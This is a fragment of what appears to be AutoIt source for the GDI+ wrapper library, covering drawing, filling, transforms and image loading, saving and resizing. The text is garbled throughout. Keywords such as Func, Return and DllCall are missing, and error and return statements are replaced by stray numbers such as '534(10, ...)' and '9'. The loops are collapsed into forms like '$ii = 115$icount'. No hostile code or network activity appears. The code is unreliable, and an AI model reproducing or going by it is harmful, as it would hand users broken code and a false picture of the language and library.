__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawellipse($hgraphics, $nx, $ny, $nwidth, $nheight, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawEllipse", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawimage($hgraphics, $himage, $nx, $ny)
$aresult = ($__g_hgdipdll, "int", "GdipDrawImage", "handle", $hgraphics, "handle", $himage, "float", $nx, "float", $ny)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawimagepointsrect($hgraphics, $himage, $nulx, $nuly, $nurx, $nury, $nllx, $nlly, $nsrcx, $nsrcy, $nsrcwidth, $nsrcheight, $himageattributes = 0, $iunit = 2)
$tpoints = ("float X; float Y; float X2; float Y2; float X3; float Y3;")
($tpoints, "X", $nulx)
($tpoints, "Y", $nuly)
($tpoints, "X2", $nurx)
($tpoints, "Y2", $nury)
($tpoints, "X3", $nllx)
($tpoints, "Y3", $nlly)
$aresult = ($__g_hgdipdll, "int", "GdipDrawImagePointsRect", "handle", $hgraphics, "handle", $himage, "struct*", $tpoints, "int", 3, "float", $nsrcx, "float", $nsrcy, "float", $nsrcwidth, "float", $nsrcheight, "int", $iunit, "handle", $himageattributes, "ptr", 0, "ptr", 0)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawimagerect($hgraphics, $himage, $nx, $ny, $nw, $nh)
$aresult = ($__g_hgdipdll, "int", "GdipDrawImageRect", "handle", $hgraphics, "handle", $himage, "float", $nx, "float", $ny, "float", $nw, "float", $nh)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawimagerectrect($hgraphics, $himage, $nsrcx, $nsrcy, $nsrcwidth, $nsrcheight, $ndstx, $ndsty, $ndstwidth, $ndstheight, $pattributes = 0, $iunit = 2)
$aresult = ($__g_hgdipdll, "int", "GdipDrawImageRectRect", "handle", $hgraphics, "handle", $himage, "float", $ndstx, "float", $ndsty, "float", $ndstwidth, "float", $ndstheight, "float", $nsrcx, "float", $nsrcy, "float", $nsrcwidth, "float", $nsrcheight, "int", $iunit, "handle", $pattributes, "ptr", 0, "ptr", 0)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawline($hgraphics, $nx1, $ny1, $nx2, $ny2, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawLine", "handle", $hgraphics, "handle", $hpen, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawpath($hgraphics, $hpath, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawPath", "handle", $hgraphics, "handle", $hpen, "handle", $hpath)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawpie($hgraphics, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawPie", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawpolygon($hgraphics, $apoints, $hpen = 0)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawPolygon", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawrect($hgraphics, $nx, $ny, $nwidth, $nheight, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawRectangle", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawstring($hgraphics, $sstring, $nx, $ny, $sfont = "Arial", $nsize = 10, $iformat = 0)
$hbrush = _gdiplus_brushcreatesolid()
$hformat = _gdiplus_stringformatcreate($iformat)
$hfamily = _gdiplus_fontfamilycreate($sfont)
$hfont = _gdiplus_fontcreate($hfamily, $nsize)
$tlayout = _gdiplus_rectfcreate($nx, $ny, 0, 0)
$ainfo = _gdiplus_graphicsmeasurestring($hgraphics, $sstring, $hfont, $tlayout, $hformat)
@error534(@error, @extended, 0)
$aresult = _gdiplus_graphicsdrawstringex($hgraphics, $sstring, $hfont, $ainfo[0], $hformat, $hbrush)
$ierror = @error, $iextended = @extended
_gdiplus_fontdispose($hfont)
_gdiplus_fontfamilydispose($hfamily)
_gdiplus_stringformatdispose($hformat)
_gdiplus_brushdispose($hbrush)
($ierror, $iextended, $aresult)

_gdiplus_graphicsdrawstringex($hgraphics, $sstring, $hfont, $tlayout, $hformat, $hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipDrawString", "handle", $hgraphics, "wstr", $sstring, "int", -1, "handle", $hfont, "struct*", $tlayout, "handle", $hformat, "handle", $hbrush)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillclosedcurve($hgraphics, $apoints, $hbrush = 0)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillClosedCurve", "handle", $hgraphics, "handle", $hbrush, "struct*", $tpoints, "int", $icount)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillclosedcurve($hgraphics, $apoints, $ntension, $hbrush = 0, $ifillmode = 0)
$ii, $icount, $tpoints, $aresult
__gdiplus_brushdefcreate($hbrush)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipFillClosedCurve2", "handle", $hgraphics, "handle", $hbrush, "struct*", $tpoints, "int", $icount, "float", $ntension, "int", $ifillmode)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillellipse($hgraphics, $nx, $ny, $nwidth, $nheight, $hbrush = 0)
__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillEllipse", "handle", $hgraphics, "handle", $hbrush, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillpath($hgraphics, $hpath, $hbrush = 0)
__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillPath", "handle", $hgraphics, "handle", $hbrush, "handle", $hpath)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillpie($hgraphics, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle, $hbrush = 0)
__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillPie", "handle", $hgraphics, "handle", $hbrush, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillpolygon($hgraphics, $apoints, $hbrush = 0)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillPolygon", "handle", $hgraphics, "handle", $hbrush, "struct*", $tpoints, "int", $icount, "int", "FillModeAlternate")
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillrect($hgraphics, $nx, $ny, $nwidth, $nheight, $hbrush = 0)
__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillRectangle", "handle", $hgraphics, "handle", $hbrush, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsfillregion($hgraphics, $hregion, $hbrush = 0)
__gdiplus_brushdefcreate($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipFillRegion", "handle", $hgraphics, "handle", $hbrush, "handle", $hregion)
__gdiplus_brushdefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsgetcompositingmode($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipGetCompositingMode", "handle", $hgraphics, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_graphicsgetcompositingquality($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipGetCompositingQuality", "handle", $hgraphics, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_graphicsgetdc($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipGetDC", "handle", $hgraphics, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_graphicsgetinterpolationmode($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipGetInterpolationMode", "handle", $hgraphics, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_graphicsgetsmoothingmode($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipGetSmoothingMode", "handle", $hgraphics, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]
$gdip_smoothingmode_none

$gdip_smoothingmode_highquality, $gdip_smoothingmode_antialias8x4

$gdip_smoothingmode_antialias8x8





_gdiplus_graphicsgettransform($hgraphics, $hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipGetWorldTransform", "handle", $hgraphics, "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsmeasurecharacterranges($hgraphics, $sstring, $hfont, $tlayout, $hstringformat)
$icount = _gdiplus_stringformatgetmeasurablecharacterrangecount($hstringformat)
@error534(@error, @extended, 0)
$tregions = ("handle[" & $icount & "]")
$aregions[$icount + 1] = [$icount]
$ii = 115$icount
$aregions[$ii] = _gdiplus_regioncreate()
($tregions, 1, $aregions[$ii], $ii)

($__g_hgdipdll, "int", "GdipMeasureCharacterRanges", "handle", $hgraphics, "wstr", $sstring, "int", -1, "hwnd", $hfont, "struct*", $tlayout, "handle", $hstringformat, "int", $icount, "struct*", $tregions)
$ierror = @error, $iextended = @extended
$ierror5
$ii = 115$icount
_gdiplus_regiondispose($aregions[$ii])

($ierror + 10, $iextended, 0)

$aregions

_gdiplus_graphicsmeasurestring($hgraphics, $sstring, $hfont, $tlayout, $hformat)
$trectf = ($taggdiprectf)
$aresult = ($__g_hgdipdll, "int", "GdipMeasureString", "handle", $hgraphics, "wstr", $sstring, "int", -1, "handle", $hfont, "struct*", $tlayout, "handle", $hformat, "struct*", $trectf, "int*", 0, "int*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$ainfo[3]
$ainfo[0] = $trectf
$ainfo[1] = $aresult[8]
$ainfo[2] = $aresult[9]
$ainfo

_gdiplus_graphicsreleasedc($hgraphics, $hdc)
$aresult = ($__g_hgdipdll, "int", "GdipReleaseDC", "handle", $hgraphics, "handle", $hdc)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_graphicsresetclip($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipResetClip", "handle", $hgraphics)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsresettransform($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipResetWorldTransform", "handle", $hgraphics)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsrestore($hgraphics, $istate)
$aresult = ($__g_hgdipdll, "int", "GdipRestoreGraphics", "handle", $hgraphics, "uint", $istate)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsrotatetransform($hgraphics, $fangle, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipRotateWorldTransform", "handle", $hgraphics, "float", $fangle, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssave($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipSaveGraphics", "handle", $hgraphics, "uint*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_graphicsscaletransform($hgraphics, $fscalex, $fscaley, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipScaleWorldTransform", "handle", $hgraphics, "float", $fscalex, "float", $fscaley, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetclippath($hgraphics, $hpath, $icombinemode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetClipPath", "handle", $hgraphics, "handle", $hpath, "int", $icombinemode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetcliprect($hgraphics, $nx, $ny, $nwidth, $nheight, $icombinemode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetClipRect", "handle", $hgraphics, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "int", $icombinemode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetclipregion($hgraphics, $hregion, $icombinemode = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetClipRegion", "handle", $hgraphics, "handle", $hregion, "int", $icombinemode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetcompositingmode($hgraphics, $icompositionmode)
$aresult = ($__g_hgdipdll, "int", "GdipSetCompositingMode", "handle", $hgraphics, "int", $icompositionmode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetcompositingquality($hgraphics, $icompositionquality)
$aresult = ($__g_hgdipdll, "int", "GdipSetCompositingQuality", "handle", $hgraphics, "int", $icompositionquality)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetinterpolationmode($hgraphics, $iinterpolationmode)
$aresult = ($__g_hgdipdll, "int", "GdipSetInterpolationMode", "handle", $hgraphics, "int", $iinterpolationmode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetpixeloffsetmode($hgraphics, $ipixeloffsetmode)
$aresult = ($__g_hgdipdll, "int", "GdipSetPixelOffsetMode", "handle", $hgraphics, "int", $ipixeloffsetmode)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssetsmoothingmode($hgraphics, $ismooth)
$ismooth < $gdip_smoothingmode_default2$ismooth > $gdip_smoothingmode_antialias8x85$ismooth = $gdip_smoothingmode_default
$aresult = ($__g_hgdipdll, "int", "GdipSetSmoothingMode", "handle", $hgraphics, "int", $ismooth)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssettextrenderinghint($hgraphics, $itextrenderinghint)
$aresult = ($__g_hgdipdll, "int", "GdipSetTextRenderingHint", "handle", $hgraphics, "int", $itextrenderinghint)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicssettransform($hgraphics, $hmatrix)
$aresult = ($__g_hgdipdll, "int", "GdipSetWorldTransform", "handle", $hgraphics, "handle", $hmatrix)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicstransformpoints($hgraphics, 36$apoints, $icoordspaceto = 0, $icoordspacefrom = 1)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], ($ii - 1) * 2 + 1)
($tpoints, 1, $apoints[$ii][1], ($ii - 1) * 2 + 2)

$aresult = ($__g_hgdipdll, "int", "GdipTransformPoints", "handle", $hgraphics, "int", $icoordspaceto, "int", $icoordspacefrom, "struct*", $tpoints, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
$ii = 115$icount
$apoints[$ii][0] = ($tpoints, 1, ($ii - 1) * 2 + 1)
$apoints[$ii][1] = ($tpoints, 1, ($ii - 1) * 2 + 2)

9

_gdiplus_graphicstranslatetransform($hgraphics, $ndx, $ndy, $iorder = 0)
$aresult = ($__g_hgdipdll, "int", "GdipTranslateWorldTransform", "handle", $hgraphics, "float", $ndx, "float", $ndy, "int", $iorder)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_hatchbrushcreate($ihatchstyle = 0, $iargbforeground = -1, $iargbbackground = -1)
$aresult = ($__g_hgdipdll, "int", "GdipCreateHatchBrush", "int", $ihatchstyle, "uint", $iargbforeground, "uint", $iargbbackground, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_hiconcreatefrombitmap($hbitmap)
$aresult = ($__g_hgdipdll, "int", "GdipCreateHICONFromBitmap", "handle", $hbitmap, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_imageattributescreate()
$aresult = ($__g_hgdipdll, "int", "GdipCreateImageAttributes", "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[1]

_gdiplus_imageattributesdispose($himageattributes)
$aresult = ($__g_hgdipdll, "int", "GdipDisposeImageAttributes", "handle", $himageattributes)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imageattributessetcolorkeys($himageattributes, $icoloradjusttype = 0, $benable = 40, $iargblow = 0, $iargbhigh = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetImageAttributesColorKeys", "handle", $himageattributes, "int", $icoloradjusttype, "int", $benable, "uint", $iargblow, "uint", $iargbhigh)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imageattributessetcolormatrix($himageattributes, $icoloradjusttype = 0, $benable = 40, $tclrmatrix = 0, $tgraymatrix = 0, $icolormatrixflags = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSetImageAttributesColorMatrix", "handle", $himageattributes, "int", $icoloradjusttype, "int", $benable, "struct*", $tclrmatrix, "struct*", $tgraymatrix, "int", $icolormatrixflags)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imagedispose($himage)
$aresult = ($__g_hgdipdll, "int", "GdipDisposeImage", "handle", $himage)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imagegetflags($himage)
$aflag[2] = [0, ""]
($himage = -1)(3$himage)534(11, 0, $aflag)
$aimageflags[13][2] = [["Pixel data Cacheable", $gdip_imageflags_caching], ["Pixel data read-only", $gdip_imageflags_readonly], ["Pixel size in image", $gdip_imageflags_hasrealpixelsize], ["DPI info in image", $gdip_imageflags_hasrealdpi], ["YCCK color space", $gdip_imageflags_colorspace_ycck], ["YCBCR color space", $gdip_imageflags_colorspace_ycbcr], ["Grayscale image", $gdip_imageflags_colorspace_gray], ["CMYK color space", $gdip_imageflags_colorspace_cmyk], ["RGB color space", $gdip_imageflags_colorspace_rgb], ["Partially scalable", $gdip_imageflags_partiallyscalable], ["Alpha values other than 0 (transparent) and 255 (opaque)", $gdip_imageflags_hastranslucent], ["Alpha values", $gdip_imageflags_hasalpha], ["Scalable", $gdip_imageflags_scalable]]
$aresult = ($__g_hgdipdll, "int", "GdipGetImageFlags", "handle", $himage, "long*", 0)
@error534(@error, @extended, $aflag)
$aresult[0]534(10, $aresult[0], $aflag)
$aresult[2] = $gdip_imageflags_none5
$aflag[1] = "No pixel data"
(12, $aresult[2], $aflag)

$aflag[0] = $aresult[2]
$i = 01512
($aresult[2], $aimageflags[$i][1]) = $aimageflags[$i][1]5
($aflag[1])5$aflag[1] &= "|"
$aresult[2] -= $aimageflags[$i][1]
$aflag[1] &= $aimageflags[$i][0]


$aflag

_gdiplus_imagegetgraphicscontext($himage)
$aresult = ($__g_hgdipdll, "int", "GdipGetImageGraphicsContext", "handle", $himage, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_imagegetheight($himage)
$aresult = ($__g_hgdipdll, "int", "GdipGetImageHeight", "handle", $himage, "uint*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_imagegethorizontalresolution($himage)
($himage = -1)(3$himage)534(11, 0, 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetImageHorizontalResolution", "handle", $himage, "float*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
($aresult[2])

_gdiplus_imagegetpixelformat($himage)
$aformat[2] = [0, ""]
($himage = -1)(3$himage)534(11, 0, $aformat)
$apixelformat[14][2] = [["1 Bpp Indexed", $gdip_pxf01indexed], ["4 Bpp Indexed", $gdip_pxf04indexed], ["8 Bpp Indexed", $gdip_pxf08indexed], ["16 Bpp Grayscale", $gdip_pxf16grayscale], ["16 Bpp RGB 555", $gdip_pxf16rgb555], ["16 Bpp RGB 565", $gdip_pxf16rgb565], ["16 Bpp ARGB 1555", $gdip_pxf16argb1555], ["24 Bpp RGB", $gdip_pxf24rgb], ["32 Bpp RGB", $gdip_pxf32rgb], ["32 Bpp ARGB", $gdip_pxf32argb], ["32 Bpp PARGB", $gdip_pxf32pargb], ["48 Bpp RGB", $gdip_pxf48rgb], ["64 Bpp ARGB", $gdip_pxf64argb], ["64 Bpp PARGB", $gdip_pxf64pargb]]
$aresult = ($__g_hgdipdll, "int", "GdipGetImagePixelFormat", "handle", $himage, "int*", 0)
@error534(@error, @extended, $aformat)
$aresult[0]534(10, $aresult[0], $aformat)
$i = 01513
$apixelformat[$i][1] = $aresult[2]5
$aformat[0] = $apixelformat[$i][1]
$aformat[1] = $apixelformat[$i][0]
$aformat


(12, 0, $aformat)

_gdiplus_imagegetrawformat($himage)
$aguid[2]
($himage = -1)(3$himage)534(11, 0, $aguid)
$aimagetype[11][2] = [["UNDEFINED", $gdip_imageformat_undefined], ["MEMORYBMP", $gdip_imageformat_memorybmp], ["BMP", $gdip_imageformat_bmp], ["EMF", $gdip_imageformat_emf], ["WMF", $gdip_imageformat_wmf], ["JPEG", $gdip_imageformat_jpeg], ["PNG", $gdip_imageformat_png], ["GIF", $gdip_imageformat_gif], ["TIFF", $gdip_imageformat_tiff], ["EXIF", $gdip_imageformat_exif], ["ICON", $gdip_imageformat_icon]]
$tstruct = ("byte[16]")
$aresult1 = ($__g_hgdipdll, "int", "GdipGetImageRawFormat", "handle", $himage, "struct*", $tstruct)
@error534(@error, @extended, $aguid)
$aresult1[0]534(10, $aresult1[0], $aguid)
$sresult2 = _winapi_stringfromguid($aresult1[2])
@error534(@error + 20, @extended, $aguid)
$sresult2 = ""534(12, 0, $aguid)
$i = 01510
$aimagetype[$i][1] == $sresult25
$aguid[0] = $aimagetype[$i][1]
$aguid[1] = $aimagetype[$i][0]
$aguid


(13, 0, $aguid)

_gdiplus_imagegettype($himage)
($himage = -1)(3$himage)534(11, 0, -1)
$aresult = ($__g_hgdipdll, "int", "GdipGetImageType", "handle", $himage, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_imagegetverticalresolution($himage)
($himage = -1)(3$himage)534(11, 0, 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetImageVerticalResolution", "handle", $himage, "float*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
($aresult[2])

_gdiplus_imagegetwidth($himage)
$aresult = ($__g_hgdipdll, "int", "GdipGetImageWidth", "handle", $himage, "uint*", -1)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_imageloadfromfile($sfilename)
$aresult = ($__g_hgdipdll, "int", "GdipLoadImageFromFile", "wstr", $sfilename, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_imageloadfromstream($pstream)
$aresult = ($__g_hgdipdll, "int", "GdipLoadImageFromStream", "ptr", $pstream, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_imagerotateflip($himage, $irotatefliptype)
$aresult = ($__g_hgdipdll, "int", "GdipImageRotateFlip", "handle", $himage, "int", $irotatefliptype)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imagesavetofile($himage, $sfilename)
$sext = __gdiplus_extractfileext($sfilename)
$sclsid = _gdiplus_encodersgetclsid($sext)
$sclsid = ""534(-1, 0, 40)
$bret = _gdiplus_imagesavetofileex($himage, $sfilename, $sclsid, 0)
(@error, @extended, $bret)

_gdiplus_imagesavetofileex($himage, $sfilename, $sencoder, $pparams = 0)
$tguid = _winapi_guidfromstring($sencoder)
$aresult = ($__g_hgdipdll, "int", "GdipSaveImageToFile", "handle", $himage, "wstr", $sfilename, "struct*", $tguid, "struct*", $pparams)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imagesavetostream($himage, $pstream, $pencoder, $pparams = 0)
$aresult = ($__g_hgdipdll, "int", "GdipSaveImageToStream", "handle", $himage, "ptr", $pstream, "ptr", $pencoder, "ptr", $pparams)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_imagescale($himage, $iscalew, $iscaleh, $iinterpolationmode = $gdip_interpolationmode_highqualitybicubic)
$iwidth = _gdiplus_imagegetwidth($himage) * $iscalew
@error534(1, 0, 0)
$iheight = _gdiplus_imagegetheight($himage) * $iscaleh
@error534(2, 0, 0)
$hbitmap = _gdiplus_bitmapcreatefromscan($iwidth, $iheight)
@error534(3, 0, 0)
$hbmpctxt = _gdiplus_imagegetgraphicscontext($hbitmap)
@error5
_gdiplus_bitmapdispose($hbitmap)
(4, 0, 0)

_gdiplus_graphicssetinterpolationmode($hbmpctxt, $iinterpolationmode)
@error5
_gdiplus_graphicsdispose($hbmpctxt)
_gdiplus_bitmapdispose($hbitmap)
(5, 0, 0)

_gdiplus_graphicsdrawimagerect($hbmpctxt, $himage, 0, 0, $iwidth, $iheight)
@error5
_gdiplus_graphicsdispose($hbmpctxt)
_gdiplus_bitmapdispose($hbitmap)
(6, 0, 0)

_gdiplus_graphicsdispose($hbmpctxt)
$hbitmap

_gdiplus_imageresize($himage, $inewwidth, $inewheight, $iinterpolationmode = $gdip_interpolationmode_highqualitybicubic)
$hbitmap = _gdiplus_bitmapcreatefromscan($inewwidth, $inewheight)
@error534(1, 0, 0)
$hbmpctxt = _gdiplus_imagegetgraphicscontext($hbitmap)
@error5
_gdiplus_bitmapdispose($hbitmap)
(2, @extended, 0)

_gdiplus_graphicssetinterpolationmode($hbmpctxt, $iinterpolationmode)
@error5
_gdiplus_graphicsdispose($hbmpctxt)
_gdiplus_bitmapdispose($hbitmap)
(3, @extended, 0)

_gdiplus_graphicsdrawimagerect($hbmpctxt, $himage, 0, 0, $inewwidth, $inewheight)
@error5
_gdiplus_graphicsdispose($hbmpctxt)
_gdiplus_bitmapdispose($hbitmap)
(4, @extended, 0)

_gdiplus_graphicsdispose($hbmpctxt)
$hbitmap

_gdiplus_linebrushcreate($nx1, $ny1, $nx2, $ny2, $iargbclr1, $iargbclr2, $iwrapmode = 0)
$tpointf1, $tpointf2, $aresult
$tpointf1 = ("float;float")
$tpointf2 = ("float;float")
